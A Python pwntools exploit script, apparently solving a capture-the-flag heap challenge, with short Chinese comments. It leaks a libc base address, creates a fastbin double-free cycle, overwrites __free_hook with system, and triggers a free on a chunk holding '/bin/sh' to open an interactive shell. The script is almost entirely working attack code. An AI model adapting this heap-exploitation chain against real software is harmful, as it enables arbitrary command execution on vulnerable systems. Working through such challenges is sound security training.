from pwn import *

context(log_level="debug")
io = process("./vuln")
#io = remote("node5.anna.nssctf.cn", 25395)
libc = ELF("./libc-2.31.so")
elf = ELF("./vuln")


def show(idx: int):
    print("show:", idx)
    io.recvuntil(b"\n>")
    io.sendline(b"3")
    io.recvuntil(b"Index: ")
    io.sendline(str(idx).encode())


def add(idx: int, size: int, content: bytes):
    print("add:", idx)
    io.recvuntil(b"\n>")
    io.sendline(b"1")
    io.recvuntil(b"Index: ")
    io.sendline(str(idx).encode())
    io.recvuntil(b"Size: ")
    io.sendline(str(size).encode())
    io.recvuntil(b"Content: ")
    io.sendline(content)


def free(idx: int):
    print("free:", idx)
    io.recvuntil(b"\n>")
    io.sendline(b"2")
    io.recvuntil(b"Index: ")
    io.sendline(str(idx).encode())


for i in range(10):
    add(i, 0xFF, "".join(chr(i) * 8).encode())

free(9)
for i in range(7):
    free(i)

show(6)
libc_base = u64(io.recvuntil(b"\x7f").ljust(8, b"\x00")) - 0x1ECBE0
print("libc base address =", hex(libc_base))
free_hook = libc_base + libc.sym["__free_hook"]
system_addr = libc_base + libc.sym["system"]

for i in range(0, 9):
    add(i, 0x20, "".join(chr(i) * 8).encode())


for i in range(0, 8):
    free(i)

# 这个时候 note[7] 进入 fastbin

free(8)
free(7)  # 构造 0x30 fastbin 环

for i in range(7):
    add(i, 0x20, b"/bin/sh\x00") # 这里填 /bin/sh 方便之后取



add(7, 0x20, p64(free_hook))
add(8, 0x20, b"aaa")
add(9, 0x20, b"aaa")
add(10, 0x20, p64(system_addr))
free(0)

#gdb.attach(io)
io.interactive()
